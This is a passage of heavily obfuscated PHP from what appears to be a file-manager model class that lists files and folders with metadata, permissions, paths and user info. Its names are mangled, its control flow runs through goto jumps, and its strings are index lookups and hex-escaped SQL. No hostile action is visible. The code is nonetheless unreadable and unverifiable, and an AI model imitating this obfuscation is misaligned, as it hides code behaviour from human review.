$this->_listAppendFileMeta($F›®……¿ì, $c¸ê ßíÑ«); $this->_listAppendChildren($F›®……¿ì, $c¸ê ßíÑ«); } goto bòçàùß”İ; bòçàùß”İ: $this->_listAppendPath($F›®……¿ì); $this->_listAppendAuth($F›®……¿ì); $this->_listAppendSourceInfo($F›®……¿ì, $c¸ê ßíÑ«); goto D½­æã¶Ãô; D½­æã¶Ãô: $this->_listAppendUser($F›®……¿ì); $this->_listFilterInfo($F›®……¿ì, $F¿Ş©¸ªä®); goto C¤áóµĞïñ; C¤áóµĞïñ: } protected function _listSourceCache($D­Ï™¹®Ì) { $C“ÔÙÛË’ =& $_SERVER[¨¤¼…´]; foreach ($D­Ï™¹®Ì as $eİÁôƒ³”) { self::$cacheSourceInfo[$C“ÔÙÛË’[422] . $eİÁôƒ³”[$C“ÔÙÛË’[381]]] = $eİÁôƒ³”; } } protected function _listFilterInfo(&$c™Ã–Æ®¿¹, $EÀÇùó±¦ß = false) { $DÓºùÁ¾Ø =& $_SERVER[¨¤¼…´]; foreach ($c™Ã–Æ®¿¹ as &$FêÅÃ¯¥‹) { $FêÅÃ¯¥‹ = $this->pathInfoFilter($FêÅÃ¯¥‹); self::$cachePathInfo[$DÓºùÁ¾Ø[423] . intval($EÀÇùó±¦ß) . $DÓºùÁ¾Ø[424] . $FêÅÃ¯¥‹[$DÓºùÁ¾Ø[381]]] = $FêÅÃ¯¥‹; } unset($FêÅÃ¯¥‹); } protected function _listMake(&$b³Æ„Ù‡ùé) { $C’ÎìÄê… =& $_SERVER[¨¤¼…´]; $b³Æ„Ù‡ùé[$C’ÎìÄê…[84]] = array(); $b³Æ„Ù‡ùé[$C’ÎìÄê…[83]] = array(); foreach ($b³Æ„Ù‡ùé[$C’ÎìÄê…[367]] as $DÌÂ‰ì¤) { $c¸‚ùš™Õß = $DÌÂ‰ì¤[$C’ÎìÄê…[382]] == 1 ? $C’ÎìÄê…[84] : $C’ÎìÄê…[83]; $b³Æ„Ù‡ùé[$c¸‚ùš™Õß][] = $DÌÂ‰ì¤; } unset($b³Æ„Ù‡ùé[$C’ÎìÄê…[367]]); } protected function _listAppendMeta(&$a“ë’öêº¤, $C¥ãÕÌïœ) { goto DÜ²Çùº§; EŠ¦èô¤…: foreach ($BÊ„ĞÁË¥Ò as $E¶‹Ö¾ÌÕ) { if (!isset($DÛš§õÊí[$E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[381]]])) { $DÛš§õÊí[$E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[381]]] = array(); } if (in_array($E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[99]], $aªçïÃÂßä)) { continue; } $DÛš§õÊí[$E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[381]]][$E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[99]]] = $E¶‹Ö¾ÌÕ[$Fß”‡„Í“í[372]]; } foreach ($a“ë’öêº¤ as &$D¶ï¤ˆ‚Í½) { $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[429]] = !1; if (isset($DÛš§õÊí[$D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[381]]])) { $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[429]] = $DÛš§õÊí[$D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[381]]]; } if ($this->fileIsLock($D¶ï¤ˆ‚Í½) && $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[388]]) { $Eé–Şà¦¤ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[388]][$Fß”‡„Í“í[389]] = AuthModel::authDisable($D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[388]][$Fß”‡„Í“í[389]], $Eé–Şà¦¤); $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[388]][$Fß”‡„Í“í[430]][$Fß”‡„Í“í[388]] = $D¶ï¤ˆ‚Í½[$Fß”‡„Í“í[388]][$Fß”‡„Í“í[389]]; } } unset($D¶ï¤ˆ‚Í½); goto FŒòáŒõ˜å; DÜ²Çùº§: $Fß”‡„Í“í =& $_SERVER[¨¤¼…´]; $A®ôŒˆ¤Úè = array($Fß”‡„Í“í[395] => array($Fß”‡„Í“í[396], $C¥ãÕÌïœ)); $BÊ„ĞÁË¥Ò = Model($Fß”‡„Í“í[425])->field($Fß”‡„Í“í[426])->where($A®ôŒˆ¤Úè)->select(); goto E‚¯ò•–ù—; E‚¯ò•–ù—: if (!$BÊ„ĞÁË¥Ò) { return; } $aªçïÃÂßä = array($Fß”‡„Í“í[427], $Fß”‡„Í“í[428]); $DÛš§õÊí = array(); goto EŠ¦èô¤…; FŒòáŒõ˜å: } protected function _listAppendFileMeta(&$a±±¡­×®, $a÷›ÑŒƒ‚¶) { goto Dˆ’¯ë½¿; dò‚…õÅÃ: $aÅ”…†ÆÏé = $aÅ”…†ÆÏé ? $aÅ”…†ÆÏé : array(); $aí±†ª å¡ = array(); foreach ($aÅ”…†ÆÏé as $EîìÃÚ˜±š) { if (!isset($aí±†ª å¡[$EîìÃÚ˜±š[$Bâõğ«³Å«[431]]])) { $aí±†ª å¡[$EîìÃÚ˜±š[$Bâõğ«³Å«[431]]] = array(); } $aí±†ª å¡[$EîìÃÚ˜±š[$Bâõğ«³Å«[431]]][$EîìÃÚ˜±š[$Bâõğ«³Å«[99]]] = $EîìÃÚ˜±š[$Bâõğ«³Å«[372]]; } goto aÍ˜îè¥ ò; aÍ˜îè¥ ò: foreach ($a±±¡­×® as &$E¢Î¼”†ÁĞ) { goto EŒÎ¿áÓÀ; fç¹Ê¢¡Úñ: $aÆ°Ş¯©[$Bâõğ«³Å«[87]] = $E¢Î¼”†ÁĞ[$Bâõğ«³Å«[87]]; $aÆ°Ş¯©[$Bâõğ«³Å«[38]] = $E¢Î¼”†ÁĞ[$Bâõğ«³Å«[38]]; if (!isset(self::$cacheFileInfo[$Bâõğ«³Å«[437] . $DÉÙ„ˆãÇ—])) { self::$cacheFileInfo[$Bâõğ«³Å«[437] . $DÉÙ„ˆãÇ—] = array_merge(array(), $aÆ°Ş¯©); } goto cĞ´Óµ•¿ö; E‘©§Ñè: if (isset($E¢Î¼”†ÁĞ[$Bâõğ«³Å«[171]][$Bâõğ«³Å«[170]])) { $E¢Î¼”†ÁĞ[$Bâõğ«³Å«[170]] = json_decode($E¢Î¼”†ÁĞ[$Bâõğ«³Å«[171]][$Bâõğ«³Å«[170]], !0); unset($E¢Î¼”†ÁĞ[$Bâõğ«³Å«[171]][$Bâõğ«³Å«[170]]); } goto e§Î°±º; cĞ´Óµ•¿ö: unset($D™Èç¼Á’ã[$DÉÙ„ˆãÇ—][$Bâõğ«³Å«[85]]); $dÏÕÉƒÉ¸Õ = is_array($aí±†ª å¡[$DÉÙ„ˆãÇ—]) ? $aí±†ª å¡[$DÉÙ„ˆãÇ—] : array(); $E¢Î¼”†ÁĞ[$Bâõğ«³Å«[171]] = array_merge($dÏÕÉƒÉ¸Õ, $D™Èç¼Á’ã[$DÉÙ„ˆãÇ—]); goto E‘©§Ñè; EŒÎ¿áÓÀ: $DÉÙ„ˆãÇ— = $E¢Î¼”†ÁĞ[$Bâõğ«³Å«[431]]; if (!$DÉÙ„ˆãÇ— || !isset($D™Èç¼Á’ã[$DÉÙ„ˆãÇ—])) { continue; } $aÆ°Ş¯© = $D™Èç¼Á’ã[$DÉÙ„ˆãÇ—]; goto fç¹Ê¢¡Úñ; e§Î°±º: } unset($E¢Î¼”†ÁĞ); goto b–Ë”Ïƒæ; bšÀßÉÑ‰ê: if (!$E§ø“À“×) { return; } $aêÏ‰½’ = array($Bâõğ«³Å«[432] => array($Bâõğ«³Å«[396], $E§ø“À“×)); $a›Ò¡˜¼Ğ§ = $Bâõğ«³Å«[433]; goto e†„¯ÕŸ­; e†„¯ÕŸ­: $D™Èç¼Á’ã = Model($Bâõğ«³Å«[434])->field($a›Ò¡˜¼Ğ§)->where($aêÏ‰½’)->select(); $D™Èç¼Á’ã = array_to_keyvalue($D™Èç¼Á’ã, $Bâõğ«³Å«[431]); $aÅ”…†ÆÏé = Model($Bâõğ«³Å«[435])->field($Bâõğ«³Å«[436])->where($aêÏ‰½’)->select(); goto dò‚…õÅÃ; Dˆ’¯ë½¿: $Bâõğ«³Å« =& $_SERVER[¨¤¼…´]; $E§ø“À“× = array_to_keyvalue($a±±¡­×®, $Bâõğ«³Å«[43], $Bâõğ«³Å«[431]); $E§ø“À“× = array_filter(array_unique($E§ø“À“×)); goto bšÀßÉÑ‰ê; b–Ë”Ïƒæ: } protected function _listAppendSourceInfo(&$DêãÁ¹õŞ–, $bÑó¦ªâŒ) { goto CÔ£õïß°Û; A»Æ†¥íæ’: $ešÖÅµİ¸ = array_to_keyvalue_group($cÂç¶¤œ¡“, $dßå˜âÊ×[381]); foreach ($DêãÁ¹õŞ– as &$CùùÌ¹™ò) { $CùùÌ¹™ò[$dßå˜âÊ×[403]] = array($dßå˜âÊ×[441] => 0, $dßå˜âÊ×[442] => 0, $dßå˜âÊ×[443] => 0); if (isset($FŒë“ù®Á[$CùùÌ¹™ò[$dßå˜âÊ×[381]]])) { $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[444]] = 1; $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[445]] = $FŒë“ù®Á[$CùùÌ¹™ò[$dßå˜âÊ×[381]]][$dßå˜âÊ×[38]]; } if (isset($F†¢õ›î¯­[$CùùÌ¹™ò[$dßå˜âÊ×[381]]])) { $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[446]] = array(); foreach ($F†¢õ›î¯­[$CùùÌ¹™ò[$dßå˜âÊ×[381]]] as $D›íñØÌ‘İ) { $EÃ¬ÖÆ´ñ” = $aà‰ÛÁ¤[$D›íñØÌ‘İ]; $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[446]][] = array($dßå˜âÊ×[447] => $EÃ¬ÖÆ´ñ”[$dßå˜âÊ×[379]], $dßå˜âÊ×[398] => $EÃ¬ÖÆ´ñ”[$dßå˜âÊ×[38]], $dßå˜âÊ×[448] => $EÃ¬ÖÆ´ñ”[$dßå˜âÊ×[449]]); } } if (isset($ešÖÅµİ¸[$CùùÌ¹™ò[$dßå˜âÊ×[381]]])) { $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[450]] = array(); foreach ($ešÖÅµİ¸[$CùùÌ¹™ò[$dßå˜âÊ×[381]]] as $b“®¦ Ì³É) { $CùùÌ¹™ò[$dßå˜âÊ×[403]][$dßå˜âÊ×[450]] = array($dßå˜âÊ×[451] => $b“®¦ Ì³É[$dßå˜âÊ×[452]], $dßå˜âÊ×[453] => $b“®¦ Ì³É[$dßå˜âÊ×[454]], $dßå˜âÊ×[455] => $b“®¦ Ì³É[$dßå˜âÊ×[381]], $dßå˜âÊ×[456] => $b“®¦ Ì³É[$dßå˜âÊ×[457]], $dßå˜âÊ×[458] => $b“®¦ Ì³É[$dßå˜âÊ×[459]], $dßå˜âÊ×[460] => $b“®¦ Ì³É[$dßå˜âÊ×[460]], $dßå˜âÊ×[461] => $b“®¦ Ì³É[$dßå˜âÊ×[461]]); } } } unset($CùùÌ¹™ò); goto DíÔÍ¨Ş¹à; DíÔÍ¨Ş¹à: return $DêãÁ¹õŞ–; goto aÒ¬Â”ÅÔ³; CôÃŠğäƒæ: $A¼Ø­±×® = Model($dßå˜âÊ×[404])->listData(); $e™İÀÀØ¬ = Model($dßå˜âÊ×[393])->listData(); $cÂç¶¤œ¡“ = Model($dßå˜âÊ×[440])->listSimple(); goto E·àŒ²…©œ; E·àŒ²…©œ: $aà‰ÛÁ¤ = array_to_keyvalue($B™Ú”—¾Ü, $dßå˜âÊ×[379]); $F†¢õ›î¯­ = array_to_keyvalue_group($A¼Ø­±×®, $dßå˜âÊ×[85], $dßå˜âÊ×[405]); $FŒë“ù®Á = array_to_keyvalue($e™İÀÀØ¬, $dßå˜âÊ×[85]); goto A»Æ†¥íæ’; CÔ£õïß°Û: $dßå˜âÊ× =& $_SERVER[¨¤¼…´]; if (!defined($dßå˜âÊ×[438])) { return; } $B™Ú”—¾Ü = Model($dßå˜âÊ×[439])->listData(); goto CôÃŠğäƒæ; aÒ¬Â”ÅÔ³: } protected function _listAppendChildren(&$c·†™ùê×ò, $déÁ Ï¯ñ„) { goto F­ï™„„; FØÓ«ÃŒ™Ê: foreach ($c·†™ùê×ò as &$FÕÉ³––‡) { if ($FÕÉ³––‡[$a®¡ï¢æ¥å[382]]) { unset($FÕÉ³––‡[$a®¡ï¢æ¥å[384]]); $FÕÉ³––‡[$a®¡ï¢æ¥å[206]] = intval($a‚‰íÔÃË[$FÕÉ³––‡[$a®¡ï¢æ¥å[381]] . $a®¡ï¢æ¥å[464]][$a®¡ï¢æ¥å[465]]); $FÕÉ³––‡[$a®¡ï¢æ¥å[205]] = intval($a‚‰íÔÃË[$FÕÉ³––‡[$a®¡ï¢æ¥å[381]] . $a®¡ï¢æ¥å[466]][$a®¡ï¢æ¥å[465]]); } } unset($FÕÉ³––‡); goto B¾ÛÔ£Å‡è; F­ï™„„: $a®¡ï¢æ¥å =& $_SERVER[¨¤¼…´]; $Fèâ‰ÒÆ¤â = $a®¡ï¢æ¥å[18]; $a‚‰íÔÃË = array(); goto a¼°ãŞë„í; d¤¢ô…´ËÃ: $Dƒ’‡±ÑÓ… = $this->tablePrefix . $this->tableName; for ($eóÎ¦ê¯Š = 0; $eóÎ¦ê¯Š < $cã™â—àÚ; $eóÎ¦ê¯Š++) { $bèÖˆ³’Æ¡ = intval($c·†™ùê×ò[$eóÎ¦ê¯Š][$a®¡ï¢æ¥å[409]]); if ($c·†™ùê×ò[$eóÎ¦ê¯Š][$a®¡ï¢æ¥å[382]]) { $FĞ‘ÍØİº = $c·†™ùê×ò[$eóÎ¦ê¯Š][$a®¡ï¢æ¥å[381]]; $Fèâ‰ÒÆ¤â .= "\x53\x45\x4c\x45\103\124\40\52\x20\106\122\x4f\115\x20\x28\x53\x45\x4c\x45\103\124\x20\x27{$FĞ‘ÍØİº}\137\x68\x61\163\106\151\x6c\145\47\x20\141\163\x20\150\x61\163\x2c\x63\x6f\x75\156\164\x28\x31\51\40\x61\x73\x20\150\141\163\103\x6f\x75\x6e\164\40\x46\122\x4f\x4d\40\140{$Dƒ’‡±ÑÓ…}\140\x20\12\11\x9\11\x9\x9\167\150\145\x72\x65\x20\160\x61\162\145\x6e\164\x49\104\x3d{$FĞ‘ÍØİº}\40\141\x6e\144\40\151\x73\x46\157\x6c\144\145\162\x3d\60\x20\141\x6e\x64\40\x69\163\x44\145\154\145\x74\145\75{$bèÖˆ³’Æ¡}\51\x20\141\x73\x20\164\x62\x31\x5f{$FĞ‘ÍØİº}\x20\165\156\151\x6f\x6e\40\x61\x6c\x6c\x20\xa\11\11\x9\11\x9\x53\105\x4c\105\x43\124\40\x2a\x20\x46\122\x4f\115\40\50\x53\x45\114\x45\x43\124\x20\47{$FĞ‘ÍØİº}\137\x68\141\x73\x46\x6f\154\144\145\162\47\x20\x61\163\40\x68\x61\x73\106\x69\x6c\x65\x2c\x63\157\165\156\164\50\61\51\x20\141\x73\x20\150\x61\163\103\x6f\x75\x6e\x74\40\106\x52\x4f\x4d\x20\140{$Dƒ’‡±ÑÓ…}\140\40\12\x9\x9\x9\x9\11\x77\x68\x65\x72\145\x20\160\x61\x72\145\156\x74\x49\x44\x3d{$FĞ‘ÍØİº}\40\x61\x6e\x64\40\x69\163\106\157\x6c\144\x65\x72\75\x31\x20\x61\156\144\40\x69\x73\x44\x65\x6c\x65\x74\145\75{$bèÖˆ³’Æ¡}\x29\x20\141\x73\x20\164\142\62\x5f{$FĞ‘ÍØİº}\40\x75\x6e\151\x6f\x6e\40\141\154\x6c\40"; } if ((strlen($Fèâ‰ÒÆ¤â) >= $FâøÄØ½‰‚ || $eóÎ¦ê¯Š == $cã™â—àÚ - 1) && $Fèâ‰ÒÆ¤â) { $Fèâ‰ÒÆ¤â = substr($Fèâ‰ÒÆ¤â, 0, -strlen($a®¡ï¢æ¥å[462])); $dˆĞçñˆ¨Â = $this->query($Fèâ‰ÒÆ¤â); $a‚‰íÔÃË = array_merge($a‚‰íÔÃË, $dˆĞçñˆ¨Â); $Fèâ‰ÒÆ¤â = $a®¡ï¢æ¥å[43]; } } $a‚‰íÔÃË = array_to_keyvalue($a‚‰íÔÃË, $a®¡ï¢æ¥å[463]); goto FØÓ«ÃŒ™Ê; a¼°ãŞë„í: $FâøÄØ½‰‚ = 1024 * 50; $c·†™ùê×ò = is_array($c·†™ùê×ò) ? $c·†™ùê×ò : array(); $cã™â—àÚ = count($c·†™ùê×ò); goto d¤¢ô…´ËÃ; B¾ÛÔ£Å‡è: } protected function _listAppendAuth(&$e’Ëµ…¿Ö©) { goto E‹Ö„ÓÄ¶°; E‹Ö„ÓÄ¶°: $AÈ¨‹ÊÆùÚ =& $_SERVER[¨¤¼…´]; if (!defined($AÈ¨‹ÊÆùÚ[438])) { return; } $D§›…øÓÃñ = array(); goto Cˆ—‚š“Ûî; Cˆ—‚š“Ûî: foreach ($e’Ëµ…¿Ö© as $Cİ£¥¾œÊö) { if ($Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[383]] == self::TYPE_GROUP) { $D§›…øÓÃñ[] = $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[381]]; } } if (!$D§›…øÓÃñ) { return; } $aóßğ‘Â = array_to_keyvalue($e’Ëµ…¿Ö©, $AÈ¨‹ÊÆùÚ[381]); goto AÙ©‹ãÌ¢ù; AÙ©‹ãÌ¢ù: $f¦õÚÜ¸¼ = Model($AÈ¨‹ÊÆùÚ[467])->getSourceList($D§›…øÓÃñ, $aóßğ‘Â); foreach ($e’Ëµ…¿Ö© as $câ£ßŒÜµ => &$Cİ£¥¾œÊö) { $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]] = $f¦õÚÜ¸¼[$Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[381]]]; if (!$Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]] && $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[383]] == self::TYPE_GROUP) { $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]] = Action($AÈ¨‹ÊÆùÚ[468])->pathGroupAuthMake($Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[469]]); if (!$Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]] && !_get($GLOBALS, $AÈ¨‹ÊÆùÚ[470])) { $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[203]] = !1; $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[202]] = !1; } } if ($Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]]) { $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[203]] = AuthModel::authCheckEdit($Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]][$AÈ¨‹ÊÆùÚ[389]]); $Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[202]] = AuthModel::authCheckView($Cİ£¥¾œÊö[$AÈ¨‹ÊÆùÚ[388]][$AÈ¨‹ÊÆùÚ[389]]); } $this->groupPathDisplay($Cİ£¥¾œÊö); } unset($Cİ£¥¾œÊö); goto F…º œìŠÎ; F…º œìŠÎ: } public function groupPathDisplay(&$FÉ¨‰“æµ) { goto Dà”Ú“Œ“‘; eè¸Ë¹¨: $câ‰Şé·ˆ“ = $this->parentLevelArray($D¦›Üˆ„­²[$Aä†¼ğå‚•[472]]); $B„Ç®‚æ·Ì = $Aä†¼ğå‚•[43]; foreach ($câ‰Şé·ˆ“ as $añ¬ ÆùÕâ) { $a†§Ó²’Š„ = Model($Aä†¼ğå‚•[471])->getInfo($añ¬ ÆùÕâ); $B„Ç®‚æ·Ì .= $a†§Ó²’Š„[$Aä†¼ğå‚•[403]][$Aä†¼ğå‚•[381]] . $Aä†¼ğå‚•[57]; } goto aãéáïÖ¼¨; Dà”Ú“Œ“‘: $Aä†¼ğå‚• =& $_SERVER[¨¤¼…´]; if ($FÉ¨‰“æµ[$Aä†¼ğå‚•[383]] != self::TYPE_GROUP) { return; } $D¦›Üˆ„­² = Model($Aä†¼ğå‚•[471])->getInfo($FÉ¨‰“æµ[$Aä†¼ğå‚•[469]]); goto eè¸Ë¹¨; Bù†âÅ‡¥Ì: $FÉ¨‰“æµ[$Aä†¼ğå‚•[477]] = $B„Ç®‚æ·Ì . $D¦›Üˆ„­²[$Aä†¼ğå‚•[403]][$Aä†¼ğå‚•[381]]; goto f×Ä‰ ’’‘; aãéáïÖ¼¨: $FÉ¨‰“æµ[$Aä†¼ğå‚•[473]] = $D¦›Üˆ„­²[$Aä†¼ğå‚•[474]]; $FÉ¨‰“æµ[$Aä†¼ğå‚•[392]] = $D¦›Üˆ„­²[$Aä†¼ğå‚•[472]]; $FÉ¨‰“æµ[$Aä†¼ğå‚•[475]] = $D¦›Üˆ„­²[$Aä†¼ğå‚•[476]]; goto Bù†âÅ‡¥Ì; f×Ä‰ ’’‘: } protected function _listAppendPath(&$aÈ¿Èêˆ³Ğ) { goto dÀƒ‹‘²ê; e´Ã÷é¦Æ: return $aÈ¿Èêˆ³Ğ; goto d‘µÎ—ÉÑé; dÀƒ‹‘²ê: $B¥ºº«êï =& $_SERVER[¨¤¼…´]; static $Bëæ¢ñº = array(); $b¥ µñè¾· = array(); goto eËÈçÓÇ‡É; F®ÄÈ¥‚¢: $b±’ã¸êâó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($aÈ¿Èêˆ³Ğ as &$b‘îé²É) { goto cÃø¹§å¤; fš•ø…†ÃË: if ($B¤¹Ë°Ü©©) { $C¦Ñæš´ß„ .= $b‘îé²É[$B¥ºº«êï[38]]; } if ($b‘îé²É[$B¥ºº«êï[382]]) { $C¦Ñæš´ß„ .= $B¥ºº«êï[8]; } $b‘îé²É[$B¥ºº«êï[479]] = str_replace($B¥ºº«êï[480], $B¥ºº«êï[8], $C¦Ñæš´ß„); goto EŒÉÍ„œÈ; cÃø¹§å¤: $B¤¹Ë°Ü©© = $this->parentLevelArray($b‘îé²É[$B¥ºº«êï[472]]); $C¦Ñæš´ß„ = $this->_listAppendPathRoot($b‘îé²É, $B¤¹Ë°Ü©©); foreach ($B¤¹Ë°Ü©© as $c³±­í”‘™ => $FĞøÆÛŞ± ) { if ($c³±­í”‘™ == 0 && $C¦Ñæš´ß„ && $b‘îé²É[$B¥ºº«êï[383]] == self::TYPE_GROUP) { continue; } if (isset($Bëæ¢ñº[$FĞøÆÛŞ± ])) { $C¦Ñæš´ß„ .= $Bëæ¢ñº[$FĞøÆÛŞ± ] . $B¥ºº«êï[8]; } } goto fš•ø…†ÃË; EŒÉÍ„œÈ: $Bë²‰éíÊ = trim($b‘îé²É[$B¥ºº«êï[479]], $B¥ºº«êï[8]); if ($b‘îé²É[$B¥ºº«êï[474]] == $B¥ºº«êï[481] && $Bë²‰éíÊ) { $b‘îé²É[$B¥ºº«êï[38]] = $Bë²‰éíÊ; } $this->_listAppendPathRecycle($b‘îé²É, $B¤¹Ë°Ü©©, $b±’ã¸êâó); goto cò¾¾‹ö; cò¾¾‹ö: } unset($b‘îé²É); goto e´Ã÷é¦Æ; eËÈçÓÇ‡É: foreach ($aÈ¿Èêˆ³Ğ as &$b‘îé²É) { $Bëæ¢ñº[$b‘îé²É[$B¥ºº«êï[381]]] = $b‘îé²É[$B¥ºº«êï[38]]; $B¤¹Ë°Ü©© = $this->parentLevelArray($b‘îé²É[$B¥ºº«êï[472]]); foreach ($B¤¹Ë°Ü©© as $c³±­í”‘™ => $FĞøÆÛŞ± ) { if ($c³±­í”‘™ != 0 && !isset($Bëæ¢ñº[$FĞøÆÛŞ± ])) { $b¥ µñè¾·[] = $FĞøÆÛŞ± ; } } } unset($b‘îé²É); if (count($b¥ µñè¾·) > 0) { $DğÔ°ËÍ»î = array($B¥ºº«êï[395] => array($B¥ºº«êï[396], $b¥ µñè¾·)); if (count($b¥ µñè¾·) == 1) { $Aµİ¶ØÓƒ‰ = $this->sourceInfo($b¥ µñè¾·[0]); $CøÏ„›†¸š = is_array($Aµİ¶ØÓƒ‰) ? array($Aµİ¶ØÓƒ‰) : !1; } else { $CøÏ„›†¸š = $this->field($B¥ºº«êï[478])->where($DğÔ°ËÍ»î)->select(); } $e¨É®óî°ö = array_to_keyvalue($CøÏ„›†¸š, $B¥ºº«êï[381], $B¥ºº«êï[38]); $Bëæ¢ñº = array_merge_index($Bëæ¢ñº, $e¨É®óî°ö); } goto F®ÄÈ¥‚¢; d‘µÎ—ÉÑé: } private function _listAppendPathRecycle(&$eÔäîìÎ, $bùµ’ë„Ñ, $e¾Û¶Ù¯) { goto CòÜñ·ÜÜ¡; CòÜñ·ÜÜ¡: $B¥ŸÍ¹êõ =& $_SERVER[¨¤¼…´]; if (intval($eÔäîìÎ[$B¥ŸÍ¹êõ[383]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($e¾Û¶Ù¯, $bùµ’ë„Ñ) && $eÔäîìÎ[$B¥ŸÍ¹êõ[381]] != $e¾Û¶Ù¯) { return; } goto aŒ¥³Š„Ú¾; aŒ¥³Š„Ú¾: $Eˆ¡ÄŒÜ¸¾ = explode($B¥ŸÍ¹êõ[8], trim($eÔäîìÎ[$B¥ŸÍ¹êõ[479]], $B¥ŸÍ¹êõ[8])); $DôŠøÈº¸ = implode($B¥ŸÍ¹êõ[8], array_slice($Eˆ¡ÄŒÜ¸¾, 2)); $eÔäîìÎ[$B¥ŸÍ¹êõ[479]] = $B¥ŸÍ¹êõ[8] . LNG($B¥ŸÍ¹êõ[482]) . $B¥ŸÍ¹êõ[8] . ltrim($DôŠøÈº¸, $B¥ŸÍ¹êõ[8]); goto c¶§­Œ¾Öö; c¶§­Œ¾Öö: $eÔäîìÎ[$B¥ŸÍ¹êõ[472]] = $B¥ŸÍ¹êõ[483] . implode($B¥ŸÍ¹êõ[57], array_slice($bùµ’ë„Ñ, 1)) . $B¥ŸÍ¹êõ[57]; if ($eÔäîìÎ[$B¥ŸÍ¹êõ[381]] == $e¾Û¶Ù¯) { $eÔäîìÎ[$B¥ŸÍ¹êõ[472]] = $B¥ŸÍ¹êõ[483]; $eÔäîìÎ[$B¥ŸÍ¹êõ[474]] = $B¥ŸÍ¹êõ[481]; $eÔäîìÎ[$B¥ŸÍ¹êõ[38]] = LNG($B¥ŸÍ¹êõ[482]); } $eÔäîìÎ[$B¥ŸÍ¹êõ[484]] = $B¥ŸÍ¹êõ[485]; goto A½„‚†ÊÜ; A½„‚†ÊÜ: } protected function _listAppendPathRoot(&$dÆ‚Œ“ö¸”, $cÕñó¡šçµ) { $dÛ…Ù¡‡é• =& $_SERVER[¨¤¼…´]; $E¾õòæ”Ç± = $dÛ…Ù¡‡é•[43]; if ($dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[383]] == self::TYPE_USER) { if (defined($dÛ…Ù¡‡é•[438]) && $dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[469]] == USER_ID) { $E¾õòæ”Ç± = LNG($dÛ…Ù¡‡é•[486]); if (!$cÕñó¡šçµ) { $dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[38]] = $E¾õòæ”Ç±; } } else { $AèÕ­Ë®Ç  = Model($dÛ…Ù¡‡é•[487])->getInfoSimple($dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[469]]); $E¾õòæ”Ç± = LNG($dÛ…Ù¡‡é•[488]) . $dÛ…Ù¡‡é•[167] . $AèÕ­Ë®Ç [$dÛ…Ù¡‡é•[38]] . $dÛ…Ù¡‡é•[489]; } } else { if ($dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[383]] == self::TYPE_GROUP) { $AèÕ­Ë®Ç  = Model($dÛ…Ù¡‡é•[471])->getInfoSimple($dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[469]]); $E¾õòæ”Ç± = $AèÕ­Ë®Ç [$dÛ…Ù¡‡é•[38]]; } else { if ($dÆ‚Œ“ö¸”[$dÛ…Ù¡‡é•[383]] == self::TYPE_SYSTEM) { $AèÕ­Ë®Ç  = $this->sourceInfo($cÕñó¡šçµ[0], !0); $E¾õòæ”Ç± = $AèÕ­Ë®Ç [$dÛ…Ù¡‡é•[38]]; } } } $E¾õòæ”Ç± = $E¾õòæ”Ç± ? $dÛ…Ù¡‡é•[8] . $E¾õòæ”Ç± . $dÛ…Ù¡‡é•[8] : $dÛ…Ù¡‡é•[8]; return $E¾õòæ”Ç±; } protected function _listAppendUser(&$f ø”çéÄì) { goto CÌšíèá¡; aÛôÃ”öˆæ: $DœŞªŠí’Ø = array_merge($fìÏ‹ªíà, $f¨Š–øïëÀ); $f§¸ÓÀéœ = Model($fÜõÏˆ†Œô[490])->userListInfo($DœŞªŠí’Ø); foreach ($f ø”çéÄì as &$FÀ¾ãôÅêê) { $AÚ†ñËÏ‡ = $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[390]]; $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[390]] = $f§¸ÓÀéœ[$AÚ†ñËÏ‡] ? $f§¸ÓÀéœ[$AÚ†ñËÏ‡] : !1; $AÚ†ñËÏ‡ = $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[391]]; $FÀ¾ãôÅêê[$fÜõÏˆ†Œô[391]] = $f§¸ÓÀéœ[$AÚ†ñËÏ‡] ? $f§¸ÓÀéœ[$AÚ†ñËÏ‡] : !1; if 